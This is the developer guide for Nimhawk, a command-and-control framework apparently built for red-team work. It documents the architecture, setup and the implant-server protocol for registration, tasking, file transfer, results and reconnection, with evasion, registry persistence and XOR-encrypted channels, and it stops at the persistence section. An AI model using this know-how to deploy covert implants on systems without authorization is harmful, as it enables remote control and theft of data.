<div align="center">
  <img src="docs/images/nimhawk.png" height="150">

  <h1>Nimhawk Developer Guide</h1>

  [![PRs Welcome](https://img.shields.io/badge/Contributions-Welcome-brightgreen.svg)](http://makeapullrequest.com)
  [![Platform](https://img.shields.io/badge/Implant-Windows%20x64-blue.svg)](https://github.com/hdbreaker/nimhawk)
  [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
  [![Version](https://img.shields.io/badge/Version-1.0-red.svg)](https://github.com/hdbreaker/nimhawk/releases)
</div>

---

> This document provides detailed information about the structure of the Nimhawk project, guidelines for developers who wish to contribute or modify the code, and documentation on recent improvements implemented.

## 📑 Table of contents

### Part 1: General Documentation
<details>
<summary>Click to expand</summary>

- [Project overview](#-project-overview)
- [Quick start guide](#-quick-start-guide)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Start the server](#start-the-server)
  - [Access the web interface](#access-the-web-interface)
- [Project architecture](#-project-architecture)
  - [Project structure](#project-structure)
  - [Main components](#main-components)
  - [Communication flow](#communication-flow)
- [Development guide](#-development-guide)
  - [Development environment setup](#development-environment-setup)
  - [Adding new features](#adding-new-features)
- [Configuration Parameters](#-configuration-parameters)
  - [Adding New Parameters](#adding-new-parameters)
  - [Parameter Storage](#parameter-storage)
  - [Frontend Integration](#frontend-integration)
- [Security considerations](#-security-considerations)
- [Pull request process](#-pull-request-process)
- [Support the Project](#support-the-project)
</details>

### Part 2: Implant Development
<details>
<summary>Click to expand</summary>

- [How to develop your own Implant](#how-to-develop-your-own-implant-or-extend-implant-functionality)
  - [Overview](#overview)
  - [Headers and Workspace configuration](#headers-and-workspace-configuration)
  - [Communication Routes](#communication-routes)
  - [Implants Server API Endpoints Documentation](#implants-server-api-endpoints-documentation)
    - [Registration Flow](#registration-flow-how-an-implant-call-home-for-first-time---implant-server)
    - [Task Flow](#task-flow-how-an-implant-get-a-task-to-execute---implant-server)
    - [Command Submission Flow](#command-subition-flow-how-an-implant-sends-commands-output-to-c2-server---implant-server)
    - [Implant Reconnection Flow](#implant-reconnection-flow-how-an-implant-exchange-unique_xor_key-with-c2-if-process-restart-or-a-system-reboots-happens---implant-server)
  - [Test Script](#test-script)
</details>

## 🔍 Project overview

Nimhawk is a modular Command & Control (C2) framework designed with security, flexibility, and extensibility in mind. The project is heavily based on [NimPlant](https://github.com/chvancooten/NimPlant) by [Cas van Cooten](https://github.com/chvancooten) ([@chvancooten](https://twitter.com/chvancooten)).

### Core Components

| Component | Description |
|-----------|-------------|
| **Implant** | Written in Nim for cross-platform compatibility and evasion |
| **Server** | Python-based C2 infrastructure with Admin and Implant servers |
| **Admin UI** | Modern web interface built with React/Next.js and Mantine |

Nimhawk consists of three main components:
- **Implant**: Written in Nim for cross-platform compatibility and evasion
- **Server**: Python-based C2 infrastructure with two separate server components 
    - Admin Server
    - Implant Server
- **Admin UI**: Modern web interface built with React/Next.js and Mantine

The framework builds upon NimPlant's core functionality while adding enhanced features such as a modular architecture, improved security measures, and a completely renovated graphical interface with modern authentication.

<details>
<summary><strong>Key Features</strong></summary>

### HTTP(S) Authentication & Communication:
- Machine-to-machine authentication using HTTP headers:
  - X-Correlation-ID: Pre-shared key for implant authentication
  - X-Request-ID: Unique implant identifier
  - X-Robots-Tag: Workspace UUID for operation segregation
- Customizable communication paths for:
  - Registration (/register)
  - Task retrieval (/task)
  - Result submission (/result)
  - Reconnection handling (/reconnect)
- Configurable User-Agent strings for OPSEC

### Communication Security:
- Dual XOR key encryption system:
  - Initial XOR Key: Embedded at compile-time for registration and persistence
  - Unique XOR Key: Generated per-session for secure command & control
- Base64 encoding for reliable data transmission
- Encrypted headers for enhanced OPSEC
- Customizable HTTP(S) paths and User-Agent strings

### Operational Reliability:
- Advanced reconnection system with exponential backoff
- Registry-based persistence mechanism
- Mutex implementation preventing multiple instances
- Comprehensive error handling for network disruptions
- Automatic cleanup of registry artifacts

### Command & Control:
- Modular command execution framework
- File transfer capabilities with compression
- Secure task retrieval and result submission
- Support for multiple command types:
  - Filesystem operations
  - Network commands
  - Process execution
  - System enumeration

### Operational Security:
- Workspace segregation for operation management
- Encrypted file and command transmission
- Status-aware operation modes:
  - Active/Late/Disconnected states
  - Graceful session handling
  - Clean termination procedures

### Integration Features:
- SQLite database interaction
- REST API communication
- Real-time status monitoring
- Cross-platform compilation support
- Configurable through config.toml

### Development Features:
- Modular architecture for easy extension
- Comprehensive logging system
- Test suite for API endpoints
- Development tools in dev_utils/
- Documentation for custom module development

</details>

## Project structure

The project structure has been reorganized to improve modularity and facilitate collaborative development:

```
Nimhawk/
├── .devcontainer/            # Container development configuration
├── .github/                  # GitHub configuration and workflows
├── docs/                     # Project documentation and resources
│   └── images/               # Screenshots and images
│
├── implant/                  # Nim implant source code
│   ├── NimPlant.nim          # Main implant entry point
│   ├── implant.nimble        # Nim package configuration
│   ├── nim.cfg               # Nim compiler configuration
│   ├── modules/              # Specific functionality modules
│   ├── config/               # Implant configuration
│   ├── core/                 # Core functionality
│   ├── selfProtections/      # Evasion and protection mechanisms
│   └── util/                 # General utilities
│
├── server/                   # Server component
│   ├── admin_web_ui/         # Web administration interface
│   │   ├── components/       # Reusable React components
│   │   ├── modules/          # Business logic modules
│   │   ├── pages/            # Next.js pages
│   │   └── ...               # Other UI files
│   │
│   ├── src/                  # Server source code
│   │   ├── config/           # Server configuration
│   │   ├── servers/          # Server implementations
│   │   │   ├── admin_api/    # Administration API
│   │   │   └── implants_api/ # Implant communication API
│   │   └── util/             # Server utilities
│   │
│   ├── downloads/            # Files downloaded from implants
│   ├── logs/                 # Server logs
│   └── uploads/              # Files to upload to implants
│
├── dev_utils/                # Development tools (Dev tools for testing pourpose)
├── detection/                # Detection analysis tools
│
├── .dockerignore             # Docker ignored files
├── .gitignore                # Git ignored files
├── .xorkey                   # XOR key for the project, it will be auto-generated 
├── config.toml               # Current configuration
├── config.toml.example       # Configuration template
├── Dockerfile                # Docker configuration
├── LICENSE                   # License information
├── README.md                 # Main documentation
├── DEVELOPERS.md             # Development guide
└── nimhawk.py                # Main management script
```

## Main components

### 1. Implant

The Nimhawk implant is written in Nim, providing a sophisticated, lightweight, and evasive HTTP(S) agent. Building upon NimPlant's foundation by [Cas van Cooten](https://github.com/chvancooten), it implements enhanced security features and operational capabilities.

### 2. Backend Server

The Nimhawk backend is written in Python and consists of three independent servers (Two are really important and the other one is a Worker that update stuff in backgroupd)

**Implants Server:**
- Exclusively handles communication with implants
- Processes implant check-ins and results
- Uses machine-to-machine authentication with pre-shared keys
- No direct communication with Web UI

**Admin API Server:**
- Provides the REST API for the web interface
- Manages user authentication and authorization
- Never communicates directly with implants
- Interacts with the database for CRUD operations

**Periodic Implant Checks:**
- The primary role of periodic_implant_checks is to periodically verify the status of implants to identify any that have not checked in within the expected timeframe. This helps in maintaining the operational integrity of the system by ensuring that all implants are active and communicating as expected.

### 3. Admin Web Interface

The web interface is built with React/Next.js and the Mantine component framework:

**UI Features:**
- Modern, responsive interface
- User authentication system
- Web panel for implant compilation
- Real-time visualization of information and results
- Detailed panels for implant management

### 4. Database

Nimhawk uses SQLite to store all information:

- **nimhawk.db**: SQLite database storing information about implants, users, command history, and downloaded files
- Both servers (Implants and Admin) read from and write to this database
- Serves as the data coordination point between components

## Communication flow

The project architecture implements strictly separated communication paths:

1. **Implants ↔ Implants Server (implants_server_init.py)**:
   - HTTP(S) communication with customizable paths
   - Implants authentication via pre-shared key (`httpAllowCommunicationKey`)
   - Custom HTTP headers for authentication (`X-Correlation-ID`)
   - The `X-Robots-Tag` header is used to transport the workspace_uuid during communication
   - Improved reconnection mechanism with registry cleanup and proper error handling
   - Status code-based response handling for better reliability
   - Automatic retry logic with exponential backoff

2. **Operator Dashboard ↔ Admin Server (admin_server_init.py)**:
   - HTTPS communication with REST API
   - Authentication based on usernames and passwords
   - Session management with configurable expiration

3. **Data Coordination**:
   - SQLite database as central storage point
   - No direct communication between Implant Server and Admin Server
   - All data shared through the database

## Development guide

### Development environment setup

#### Python Environment

Nimhawk's server component uses Python virtual environments to manage dependencies:

1. **Create a virtual environment**:
   ```bash
   # Navigate to the server directory
   cd server/
   
   # Create a virtual environment
   python3 -m venv venv
   
   # Activate the virtual environment
   # On Linux/macOS:
   source venv/bin/activate
   # On Windows:
   venv\Scripts\activate
   ```

2. **Install dependencies**:
   ```bash
   # Install all required packages
   pip install -r requirements.txt
   ```

3. **Install nim >= 1.6.12**
   Refer to: https://nim-lang.org/install.html

#### UI Development

The web interface is built with Next.js and uses npm for dependency management and development workflows. Here's how to set up and run the UI in development mode:

1. **Set up the development environment**:
   ```bash
   # Navigate to the UI directory
   cd server/admin_web_ui/
   
   # Install dependencies
   npm install
   ```

2. **Available npm commands**:
   ```bash
   # Start development server with hot reloading at http://localhost:3000
   npm run dev
   
   # Build the production version of the UI
   # maybe could break due to development packages and lint error, 
   # in general just use: npm run dev
   npm run build 
   
   # Run compiled version of the UI
   npm run start
   
   # Lint the code for quality checks
   npm run lint
   ```

3. **Development workflow**:
   - Review Frontend .env file and adjust to proper Servers IPs
   - Make changes to components in the `components/` directory
   - Modify pages in the `pages/` directory
   - Changes will automatically reload in the browser
   - Ensure that the backend server is running for API calls to work

When working in development mode, the UI will run on port 3000, while the backend API typically runs on port 9669 and 80. 

#### Cross-Compiling with nim.cfg

For building Windows payloads from Linux or macOS:

1. **Install MinGW toolchain**:
   ```bash
   # On macOS
   brew install mingw-w64
   
   # On Linux (Debian/Ubuntu)
   apt-get install mingw-w64
   ```

2. **Install Nim**:
   - Refer to: [https://nim-lang.org/install.html](https://nim-lang.org/install.html) (In Silicon chipset you must compile it, but it's easy)

3. **Configure nim.cfg** with the correct paths to the MinGW toolchain

## Adding new configuration parameters in config.toml file and how to propagete it

This section outlines the complete process for adding and propagating new configuration parameters in Nimhawk, from the config.toml file to the user interface.

### Configuration Flows

Nimhawk has two distinct configuration flows:

1. **Compilation Flow (Implant)**:
```
config.toml → implant/config/configParser.nim → Implant binary
```
This flow handles configurations that need to be embedded in the implant during compilation, such as:
- INITIAL_XOR_KEY
- Communication paths
- User-Agent
- Other static parameters

2. **Server Flow (Runtime)**:
```
config.toml → admin_server_init.py/implants_server_init.py → db.py → frontend (nimplant.ts)
```
This flow handles dynamic configuration of the server and web interface, including:
- Workspace configuration
- Authentication parameters
- Endpoint configuration
- Implant states

### 1. Adding a New Parameter to `config.toml` and read it from Implant at compile-time

To add a new parameter in the implant configuration:

```toml
[implant]
# Existing parameters...
newParameter = "value"
```

**Compile-time processing**:
```nim
# In implant/config/configParser.nim
const new_parameter {.strdefine.}: string = ""

if new_parameter != "":
    config[obf("new_parameter")] = new_parameter

# For reference, this is similar to how xor_key is handled:
const xor_key {.intdefine.}: int = 459457925 # Default value
```

**Compilation command**:
```bash
nim c -d:new_parameter="value" ...
```

### 2. Storing the Parameter in the Database

If the new parameter needs to be stored persistently:

**Schema modification**:
```python
# In setup_database() or similar
cursor.execute("""
    ALTER TABLE implants ADD COLUMN new_parameter TEXT;
""")
```

**Access functions**:
```python
def db_store_implant_parameter(guid, parameter, value):
    with get_db_connection() as con:
        con.execute(
            "UPDATE implants SET new_parameter = ? WHERE id = ?", 
            (value, guid)
        )
```

### 3. Propagating the Parameter to the Frontend

To make the parameter available to the UI:

**Data model**:
```python
# In nimplant_listener_model.py
def asdict(self):
    return {
        "newParameter": self.new_parameter,
        # other fields...
    }
```

**API endpoint**:
```python
# In admin_server_init.py
@app.route('/api/server/config', methods=['GET'])
@require_auth
def get_server_config():
    config = db_get_server_config()
    return flask.jsonify(config)
```

**Frontend consumption**:
```typescript
// In modules/nimplant.ts
export function getServerInfo() {
    const token = localStorage.getItem("token")
    return useSWR(endpoints.server, (url) =>
        fetch(url, {
            headers: { Authorization: `Bearer ${token}` },
        }).then((res) => res.json())
    )
}
```

**Rendering**:
```tsx
// In components/ServerInfo.tsx
const { serverInfo } = getServerInfo()
return <DataRow label="New Parameter" value={serverInfo.newParameter} />
```

**Complete Example: Adding Sleep Jitter Parameter**

This comprehensive example demonstrates the full flow:

1. **In config.toml**:
   ```toml
   [implant]
   sleepJitter = 30
   ```

2. **In configParser.nim**:
   ```nim
   const sleep_jitter {.intdefine.}: int = 0
   if sleep_jitter > 0:
       config[obf("sleep_jitter")] = $sleep_jitter
   ```

3. **In the database**:
   ```python
   # Schema
   CREATE TABLE implants (
     # other fields...
     sleep_jitter INTEGER DEFAULT 0
   )
   
   # Update
   def update_jitter(guid, value):
       with get_db_connection() as con:
           con.execute("UPDATE implants SET sleep_jitter = ? WHERE id = ?", 
                      (value, guid))
   ```

4. **In the frontend**:
   ```tsx
   <JitterControl 
     value={serverInfo.sleepJitter} 
     onChange={updateJitterSetting} 
   />
   ```

When the frontend connects with the backend after logging in, the first action it performs is calling `getServerInfo`. This function populates the `serverInfo` object in `modules/nimplant.ts` with the backend settings. This is how configuration data flows from the backend to the frontend in Nimhawk.

# How to develop your own Implant or extend Implant functionality

## Overview

The communication between the Implant and the C2 server is handled by three main components:

- Admin Server: `server/src/servers/admin_api/admin_server_init.py`
- Implant Server: `server/src/servers/implants_api/implants_server_init.py`
- Implant Call to Home file: `implant/core/webClientListener.nim` (handles the core HTTP communications)

The system employs a dual XOR key encryption strategy for enhanced security. Throughout this document, we will refer to these keys as follows:

1. **Initial XOR Key**:
   - Embedded in the implant binary at compile time
   - Used for initial registration handshake and registry operations
   - Handles registry persistence in `register.nim`
   - Remains constant throughout the implant's lifecycle
   - Used for reconnection process when recovering from disconnection

2. **Unique XOR Key**:
   - Generated by server during successful registration
   - Used for all subsequent communications including:
     - Command encryption/decryption
     - File transfer operations
     - Result submission
     - Task retrieval
   - Unique per implant instance
   - Refreshed during reconnection process

All encrypted data is base64 encoded to prevent null bytes from breaking HTTP communication. This dual-key approach ensures secure persistence while maintaining unique encryption channels for each implant's communications.

IMPORTANT: Remember, you can always grep for UNIQUE_XOR_KEY and INITIAL_XOR_KEY to understand which one is being used in a specific process.

**How Nimhawk implement XOR Encryption and Usage**:
1. **Key Generation**:
   - At startup, `nimhawk.py` generates a random **Initial XOR key**
   - Key is stored in `.xorkey` file for consistency
   - Default key (459457925) is used if `.xorkey` doesn't exist

2. **Implant Compilation Process** 

   This section will explain how to pass compile time constants to implant at detail, it will help you if you want to add new compile time constants to implant.

   - **Initial XOR Key** is passed to Nim compiler via nim compiling flag `-d:INITIAL_XOR_KEY=<key>` (read nimhawk.py)
   - In `configParser.nim`, the XOR KEY is defined as:
     ```nim
     const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
     ```
   - During compilation, `{.intdefine.}` directive substitutes the default value with the **Initial XOR Key**

3. **Dual Encryption System**:
   - **Initial XOR Key**:
     - Used for initial registration handshake
     - Used to encrypt the ID stored in registry
     - Embedded in the binary at compile time
     - Ensures secure initial communication
     - Used for registry operations
   
   - **Unique XOR Key**:
     - Generated by server during implant registration
     - Sent to implant in base64 format
     - Used for all subsequent communications
     - Provides unique encryption per implant
     - Lost after process termination/reboot
     - Recovered via reconnect endpoint


## Headers and Workspace configuration:

### Implants Headers required to talk with Implant Server
| Header | Value | Description | Required |
|--------|-------|-------------|-----------|
| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine communication | Yes |
| User-Agent | `<user_agent>` | Custom user agent string configured in config.toml | Yes |
| X-Request-ID | `<implant_guid>` | Unique identifier for the implant | Yes |
| X-Robots-Tag | `<workspace_uuid>` | Workspace identifier for operational segmentation | No |



## Communication Routes

Routes are configured in `config.toml` with the following default values:

| Route | Path | Description |
|-------|------|-------------|
| Register | `/register` | Initial registration and activation of implants |
| Task | `/task` | Command delivery and file uploads |
| Result | `/result` | Command output submission |
| Reconnect | `/reconnect` | Reconnection handling for existing implants |

## Implants Server API Endpoints Documentation

### Registration Flow (How an Implant Call Home for first time) - Implant Server

**Purpose**: Handles initial implant registration and activation.

**Methods**: 
- GET: Initial registration request
- POST: Activation with implant information

**Headers required**:

| Header | Value | Description | Required |
|--------|-------|-------------|-----------|
| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine communication | Yes |
| User-Agent | `<user_agent>` | Custom user agent string configured in config.toml | Yes |
| X-Robots-Tag | `<workspace_uuid>` | Workspace identifier for operational segmentation | No |

### 1. Register Endpoint GET Flow (`/register`)

**GET Request Flow**:
```
+----------------+              +----------------+              +----------------+
|    Implant     |              |    Server      |              |   Database     |
+----------------+              +----------------+              +----------------+
        |                                |                               |
        |-------- GET /register -------> |                               |
        |                                |                               |
        |                                |---- Generate Implant GUID     |
        |                                |---- Store Implant GUID -----> |
        |                                |---- Generate Unique XOR Key   |
        |                                |---- Store Unique XOR Key ---> |
        |<-- GUID + Unique XOR Key ------|                               |
        |                                |                               |
+----------------+                +----------------+              +----------------+
```

Explained Flow:
1. Implant sends GET request to /register with authentication headers
2. Server generates new GUID and an Implant's Unique XOR Key (will be used in future operations)
3. Server returns JSON with GUID and Unique XOR Key in base64

---------------------------------------------------------------------------------------------

### 2. Register Endpoint POST Flow
**POST Request Flow**:

Communication Diagram:
```
+----------------+     +----------------+     +----------------+
|    Implant     |     |    Server      |     |   Database     |
+----------------+     +----------------+     +----------------+
        |                     |                      |
        |-- POST /register -->|                      |
        |                     |-- Store implant ---->|
        |                     |                      |
        |<-- 200 OK ----------|                      |
        |                     |                      |
+----------------+     +----------------+     +----------------+
```

Explained Flow:
1. Implant sends system information encrypted with Unique XOR Key
2. Server decrypts and validates the information
3. Server stores the implant in the database
4. Server confirms successful activation to Implant


4. **Runtime Usage**:
   - After Registration GET Flow, implant switches to unique runtime key for communication (Unique XOR Key)
   - If Unique XOR Key is lost, `/reconnect` endpoint will provides the Implant with its Unique XOR Key again
   - Important: Initial XOR Key continues to be used in Implant lifecycle, for example in registry operations between process restart or system     reboots. 
      - Also, Initial XOR Key is an important component in the reconnection process (look at `/reconnect` endpoint documentation)

**Example CURL**:
```bash
# GET Request, internally in this process INITIAL XOR KEY is used.
curl -X GET "http://server:port/register" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \

# POST Request, from this and on UNIQUE XOR KEY is used for communication process. 
curl -X POST "http://server:port/register" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
  -H "X-Request-ID: <guid>" \
  -d '{"data": "<base64_encoded_unique_xor_encrypted_system_info>"}'
```

### Task Flow (How an Implant get a task to execute) - Implant Server
### 1. Task Endpoint (`/task`)

**Purpose**: Delivers commands and handles file uploads to Implant.

**Methods**: 
- GET: Retrieve pending commands
- GET `/task/<file_id>`: Download files for upload command

**Headers Required**:

| Header | Value | Description |
|--------|-------|-------------|
| X-Request-ID | `<implant_guid>` | Unique identifier for the implant |
| User-Agent | `<user_agent>` | Configured user agent |
| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine 
| Content-MD5 | `<task_guid>` | Task GUID (only for file downloads) |


### Task flow: Execute a command

**Execute a Command Flow**:

Communication Diagram:
```
+----------------+     +----------------+     +----------------+
|    Implant     |     |    Server      |     |   Database     |
+----------------+     +----------------+     +----------------+
        |                     |                      |
        |-- GET /task ------->|                      |
        |                     |-- Query tasks ------>|
        |                     |<-- Return tasks -----|
        |                     |                      |
        |<-- Tasks -----------|                      |
        |                     |                      |
+----------------+     +----------------+     +----------------+
```

Explained Flow:
1. Implant requests pending tasks
2. Server queries tasks in the database
3. Server returns encrypted tasks to the implant (using UNIQUE_XOR_KEY)

1. **Task Retrieval** (`getQueuedCommand` function):
   - Implant sends GET request to `/task` endpoint
   - Request includes:
     - `X-Request-ID`: Implant's unique identifier
     - `User-Agent`: Configured user agent
     - `X-Correlation-ID`: HTTP authentication key
   - Server responds with encrypted task data containing:
     - Task GUID
     - Command to execute
     - Command arguments

2. **Task Processing**:
   - Implant decrypts task data using its Unique XOR Key
   - Implant parses JSON response (`webClientListener.nim`) into a `Command Object`: 
     ```nim
     type Command = object
       guid: string
       command: string
       args: seq[string]
     ```

3. **Result Submission** (`postCommandResults` function):
   - After command execution, implant prepares result data:
   - Result is encrypted using Unique XOR Key
   - POST request sent to `/result` endpoint with:
     - Encrypted command output
     - Original task GUID for correlation

    ```nim
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
     ```
   - Server confirms reception with 200 OK response

**Error Handling**:
- If server returns non-200 status code, implant marks it as "NIMPLANT_CONNECTION_ERROR"
- Failed task parsing is handled gracefully, returning empty command and GUID
- All communication is encrypted using implant's unique XOR key
- Base64 encoding prevents issues with binary data transmission

This process ensures secure, reliable command execution and result reporting between the implant and C2 server.

---------------------------------------------------------------------------------------------

### 2. Task Flow: Upload a file to Implant

This process flow is composed by two process under the hood.

**Execute a Command Flow**:


Communication Diagrams:
```
# Admin Server:
# . Operator upload a file and task Implant to download de file.

+----------------+     +------------------+        +----------------+     
|    Operator    |     |   Admin Server   |        |     SQLite     |     
|   Dashboard    |     |    (REST API)    |        |   Database     |     
+----------------+     +------------------+        +----------------+     
        |                      |                          |                      
        |                      |                          |                      
        |-- Upload File ------>|                          |                      
        |                      |-- Store File ----------> |                      
        |                      |  File Hash ID + Metadata |                      
        |<-- Upload Success ---|                          |                      
        |                      |                          |                      
        |-- Queue "upload"---> |                          |                      
        |     Command          |                          |                      
        |                      |-- Store Task ----------> |                      
        |                      |                          |                      
+----------------+     +----------------+        +----------------+             
``` 

```
# Implant Server:
# . Implant ask Implant Server for task, receive 'upload' command and FILE HASH ID
# . Download FILE to Disk

+----------------+             +----------------+     +----------------+  +----------------+
|    Implant     |             |Implant Server |      |    SQLite      |  |  File System   |
|   (Windows)    |             |   (HTTP/S)    |      |   Database     |  |   (uploads/)   |
+----------------+             +----------------+     +----------------+  +----------------+
        |                             |                     |                     |
        | GET /task                   |                     |                     |
        |---------------------------> |                     |                     |
        |                             |                     |                     |
        |                             | Query Tasks         |                     |
        |                             |-------------------->|                     |
        |                             |                     |                     |
        |                             | Return Task         |                     |
        |                             |<--------------------|                     |
        |                             |                     |                     |
        | Return "upload" command     |                     |                     |
        |<--------------------------- |                     |                     |
        |                             |                     |                     |
        | GET /task/{file_hash_id}    |                     |                     |
        | Headers:                    |                     |                     |
        | - X-Request-ID              |                     |                     |
        |   (Implant GUID)            |                     |                     |
        | - Content-MD5               |                     |                     |
        |   (Task GUID)               |                     |                     |
        |---------------------------> |                     |                     |
        |                             |                     |                     |
        |                             | Query File Info     |                     |
        |                             |-------------------->|                     |
        |                             |                     |                     |
        |                             | Return File Info    |                     |
        |                             |<--------------------|                     |
        |                             |                     |                     |
        |                             | Read File           |                     |
        |                             |-----------------------------------------> |
        |                             |                     |                     |
        |                             | Return File Content |                     |
        |                             |<----------------------------------------> |
        |                             |                     |                     |
        |                             | Process File:       |                     |
        |                             | 1. Compress         |                     |
        |                             | 2. Encrypt XOR      |                     |
        |                             | 3. Base64 encode    |                     |
        |                             |                     |                     |
        | Return File name and content|                     |                     |
        | - X-Original-Filename       |                     |                     |
        |   (encrypted name)          |                     |                     |
        |<--------------------------- |                     |                     |
        |                             |                     |                     |
        | Process File:               |                     |                     |
        | 1. Base64 decode            |                     |                     |
        | 2. XOR decrypt              |                     |                     |
        | 3. Decompress               |                     |                     |
        | 4. Save File                |                     |                     |
        |                             |                     |                     |
+----------------+             +----------------+     +----------------+  +----------------+
```

Explained Flow:
In this process both servers are involved:
 - Admin Server (admin_server_init.py): Handles Operator Dashboard communication
 - Implant Server (implants_server_init.py): Handles implants encrypted communication
 - Both interact with Database
 - You can read more about this in:
      - src/servers/admin_api/admin_server_init.py
      - src/servers/implants_api/implants_server_init.py
      - src/config/db.py

1.  When an upload command is queued through the Operator Dashboard, the following process takes place:

  - The **Admin Server** receive the file and generates a unique MD5 HASH ID to identify it
  - The server stores the file information in the database with:
    - File ID (md5 hash)
    - Original filename
    - Full file path

3. The Implant receives the `upload` command with the file FILE HASH ID vía Implant Server `/task` polling
4. The Implant requests the file from the **Implant Server** using the FILE HASH ID `/task/<file_hash_id>`
5. The **Implant Server**:
   - Verifies the file exists in the database (using db.py)
   - Reads the file content
   - Compresses the content using zlib
   - Encrypts the compressed data using UNIQUE_XOR_KEY
   - Base64 encodes the encrypted data
   - Sends the data with headers:
     - `Content-Type: application/x-gzip`
     - `X-Original-Filename: <base64_encrypted_filename>` (filename is encrypted using UNIQUE_XOR_KEY)
7. The Implant: (in upload.nim)
   - Receives the base64 encoded data
   - Decodes from base64
   - Decrypts using UNIQUE_XOR_KEY
   - Decompresses using zlib
   - Receives the decode and decrypt filename from X-Original-Filename header
   - Decrypts the filename using its UNIQUE_XOR_KEY
   - Saves the file with the decrypted original filename (filename can includes a path + filename)

**Security Note**: The filename is encrypted using the UNIQUE_XOR_KEY and base64 encoded as the file content, ensuring that both the file content and its name are protected during transmission. This add a OPSEC to the process (Not a big thing but it's better than send raw filename).

**Example CURL**:
```bash
# Get pending tasks
curl -X GET "http://server:port/task" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
  -H "X-Request-ID: <guid>" 
  
# Download file
curl -X GET "http://server:port/task/<file_hash_id>" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
  -H "X-Request-ID: <guid>" \
  -H "Content-MD5: <task_guid>"
```
---------------------------------------------------------------------------------------------


## Command Submission Flow (How an Implant sends commands output to C2 Server) - Implant Server

### 1. Result Endpoint (`/result`)

**Purpose**: Submits command execution results to Implant Server.

**Methods**: 
- POST: Submit command output

**Headers Required**:

| Header | Value | Description |
|--------|-------|-------------|
| X-Request-ID | `<implant_guid>` | Unique identifier for the implant |
| User-Agent | `<user_agent>` | Configured user agent |
| X-Correlation-ID |	`<http_allow_key>` |	Authentication key for machine-to-machine
| Content-Type | application/json | Request content type |

**Result Processing Flow**:
```
+----------------+     +----------------+     +----------------+
|    Implant     |     |    Server      |     |   Database     |
+----------------+     +----------------+     +----------------+
        |                     |                      |
        |-- POST /result ---->|                      |
        |                     |-- Store result ----->|
        |                     |                      |
        |<-- 200 OK ----------|                      |
        |                     |                      |
+----------------+     +----------------+     +----------------+
```

Explained Flow:
1. Implant executes command and encrypts result (refer to `core/cmdParser.nim`)
2. Implant sends encrypted result to server
3. Server stores result in the database
4. Server confirms successful reception

**Process Flow**:
1. Implant receive a vía `/task` endpoint (refer to `/task` endpoint documentation above)
2. Implant executes the command
2. Results are encrypted using UNIQUE_XOR_KEY with the implant's key memory.
3. Encrypted data is base64 encoded
4. POST request is sent to `/result` endpoint
5. Server:
   - Validates headers and authentication
   - Decrypts the data using the Unique XOR Key
   - Stores the result in the database
   - Updates command status to "completed"
   - Returns 200 on success

**Example CURL**:
```bash
curl -X POST "http://server:port/result" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
  -H "X-Request-ID: <guid>" \
  -H "Content-Type: application/json" \
  -d '{"data": "<base64_encoded_xor_encrypted_result>"}'
```

**Security Considerations**:
- All results are encrypted using the implant's unique XOR key
- Base64 encoding prevents null bytes from breaking HTTP communication
- Headers are validated to ensure proper authentication
- Results are stored securely in the database
- Command status is updated to prevent duplicate submissions

**Error Handling**:
- Invalid headers return 400 Bad Request
- Authentication failure returns 401 Unauthorized
- Invalid GUID returns 404 Not Found
- Server errors return 500 Internal Server Error
---------------------------------------------------------------------------------------------

## Implant Reconnection Flow (How an Implant exchange UNIQUE_XOR_KEY with C2 if process restart or a system reboots happens) - Implant Server

### 1. Reconnect Endpoint (`/reconnect`)

**Purpose**: Handles reconnection of existing implants and provides communication persistence mechanism.

**Methods**: 
- OPTIONS: Reconnection request

**Headers Required**:

| Header | Value | Description |
|--------|-------|-------------|
| X-Request-ID | `<decrypted_guid>` | Decrypted implant GUID |
| User-Agent | `<user_agent>` | Configured user agent |
| X-Correlation-ID | `<http_allow_key>` | HTTP authentication key |

**Reconnection Flow**:

Communication Diagram:
```
+----------------+     +----------------+     +----------------+
|    Implant     |     |Implant Server |     |    SQLite      |
|   (Windows)    |     |   (HTTP/S)    |     |   Database     |
+----------------+     +----------------+     +----------------+
        |                     |                     |
        | Read Registry and   |                     |
        | get Encrypted ID    |                     |
        |                     |                     |
        | Decrypt ID using    |                     |
        | INITIAL_XOR_KEY     |                     |
        |                     |                     |
        | OPTIONS /reconnect  |                     |
        | Headers:            |                     |
        | - X-Request-ID      |                     |
        |   (Decrypted ID)    |                     |
        | - X-Correlation-ID  |                     |
        |   (HTTP Auth Key)   |                     |
        | - User-Agent        |                     |
        |-------------------->|                     |
        |                     |                     |
        |                     | Query Implant Info  |
        |                     |-------------------->|
        |                     |                     |
        |                     | Return              |
        |                     | UNIQUE_XOR_KEY      |
        |                     |<--------------------|
        |                     |                     |
        | Response:           |                     |
        | Status 200 + Key or |                     |
        | Status 410 (Gone)   |                     |
        |<--------------------|                     |
        |                     |                     |
        | If 200:             |                     |
        | 1. Decode base64    |                     |
        | 2. XOR decrypt      |                     |
        | 3. Store:           |                     |
        |   UNIQUE_XOR_KEY    |                     |
        |   in Implant memory |                     |                
        |                     |                     |
        | If 410:             |                     |
        | 1. Clear registry   |                     |
        | 2. Re-register      |                     |
        |                     |                     |
+----------------+     +----------------+     +----------------+        
```

**Persistence Mechanism**:
